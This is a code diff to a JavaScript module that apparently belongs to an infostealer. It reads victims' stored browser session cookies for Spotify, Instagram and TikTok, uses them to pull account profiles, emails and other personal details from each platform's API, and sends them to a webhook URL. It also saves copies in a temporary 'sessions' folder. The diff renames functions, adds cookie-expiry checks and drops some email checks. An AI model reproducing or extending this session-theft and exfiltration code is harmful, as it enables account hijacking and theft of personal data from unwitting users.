@@ -8,7 +8,7 @@ const program = require('./../../utils/program/program.js');
 
 const BrowserStats = structures.BrowserStatistics;
 
-const spotify = async (webhookUrl) => {
+const Spotify = async (webhookUrl) => {
     const cookies = BrowserStats.cookies.filter(cookie => 
         cookie.host_key === '.spotify.com' && 
         cookie.name === 'sp_dc'
@@ -18,6 +18,8 @@ const spotify = async (webhookUrl) => {
 
     for (const cookie of cookies) {
         try {
+            if (Math.floor(Date.now() / 1000) > cookie.expires_utc) return;
+
             const response = await axios.get('https://www.spotify.com/api/account-settings/v1/profile', {
                 headers: {
                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36',
@@ -40,8 +42,6 @@ const spotify = async (webhookUrl) => {
                 gender: gender,
                 email: email
             };
-
-            if (full_profile.email === 'Not Found') return;
 
             const data = {
                 embeds: [{
@@ -93,8 +93,8 @@ const spotify = async (webhookUrl) => {
                 }],
             };
 
-            await program.delay(1000);
-            await requests.webhook(webhookUrl, data);
+            await program.Delay(1000);
+            await requests.Webhook(webhookUrl, data);
 
             const spotifyInfo = [
                 `Username: ${full_profile.username}`,
@@ -107,7 +107,7 @@ const spotify = async (webhookUrl) => {
             ];
 
             const WishTempDir = fileutil.WishTempDir('sessions');
-            await fileutil.writeDataToFile(WishTempDir, `spotifyInfo-${program.randString(10)}.txt`, spotifyInfo);
+            await fileutil.WriteDataToFile(WishTempDir, `spotifyInfo-${program.RandString(10)}.txt`, spotifyInfo);
             
         } catch (error) {
             console.error(error);
@@ -115,7 +115,7 @@ const spotify = async (webhookUrl) => {
     }
 };
 
-const instagram = async (webhookUrl) => {
+const Instagram = async (webhookUrl) => {
     const cookies = BrowserStats.cookies.filter(cookie => 
         cookie.host_key === '.instagram.com' && 
         cookie.name === 'sessionid'
@@ -125,6 +125,8 @@ const instagram = async (webhookUrl) => {
 
     for (const cookie of cookies) {
         try {
+            if (Math.floor(Date.now() / 1000) > cookie.expires_utc) return;
+
             const userResponse = await axios.get('https://i.instagram.com/api/v1/accounts/current_user/?edit=true', {
                 headers: {
                     'Host': 'i.instagram.com',
@@ -172,8 +174,6 @@ const instagram = async (webhookUrl) => {
                 birthday: birthday,
                 email: email,
             };
-
-            if (full_profile.email === 'Not Found') return;
 
             const data = {
                 embeds: [{
@@ -239,8 +239,8 @@ const instagram = async (webhookUrl) => {
                 }],
             };
 
-            await program.delay(1000);
-            await requests.webhook(webhookUrl, data);
+            await program.Delay(1000);
+            await requests.Webhook(webhookUrl, data);
 
             const instagramInfo = [
                 `Username: ${full_profile.username}`,
@@ -255,7 +255,7 @@ const instagram = async (webhookUrl) => {
             ];
 
             const WishTempDir = fileutil.WishTempDir('sessions');
-            await fileutil.writeDataToFile(WishTempDir, `instagramInfo-${program.randString(10)}.txt`, instagramInfo);
+            await fileutil.WriteDataToFile(WishTempDir, `instagramInfo-${program.RandString(10)}.txt`, instagramInfo);
 
         } catch (error) {
             console.error(error);
@@ -263,7 +263,7 @@ const instagram = async (webhookUrl) => {
     }
 };
 
-const tiktok = async (webhookUrl) => {
+const Tiktok = async (webhookUrl) => {
     const cookies = BrowserStats.cookies.filter(cookie => 
         cookie.host_key === '.tiktok.com' && 
         cookie.name === 'sessionid'
@@ -273,6 +273,8 @@ const tiktok = async (webhookUrl) => {
 
     for (const cookie of cookies) {
         try {
+            if (Math.floor(Date.now() / 1000) > cookie.expires_utc) return;
+
             const userResponse = await axios.get('https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE', {
                 headers: {
                     'accept': 'application/json, text/plain, */*',
@@ -335,8 +337,6 @@ const tiktok = async (webhookUrl) => {
                 username: username,
                 email: email,
             };
-
-            if (full_profile.email === 'Not Found') return;
 
             const data = {
                 embeds: [{
@@ -402,8 +402,8 @@ const tiktok = async (webhookUrl) => {
                 }],
             };
 
-            await program.delay(1000);
-            await requests.webhook(webhookUrl, data);
+            await program.Delay(1000);
+            await requests.Webhook(webhookUrl, data);
 
             const tiktokInfo = [
                 `Username: ${full_profile.username}`,
@@ -417,7 +417,7 @@ const tiktok = async (webhookUrl) => {
             ];
 
             const WishTempDir = fileutil.WishTempDir('sessions');
-            await fileutil.writeDataToFile(WishTempDir, `tiktokInfo-${program.randString(10)}.txt`, tiktokInfo);
+            await fileutil.WriteDataToFile(WishTempDir, `tiktokInfo-${program.RandString(10)}.txt`, tiktokInfo);
 
         } catch (error) {
             console.error(error);
@@ -426,7 +426,7 @@ const tiktok = async (webhookUrl) => {
 };
 
 module.exports = async (webhookUrl) => {
-    await spotify(webhookUrl);
-    await instagram(webhookUrl);
-    await tiktok(webhookUrl);
+    await Spotify(webhookUrl);
+    await Instagram(webhookUrl);
+    await Tiktok(webhookUrl);
 };
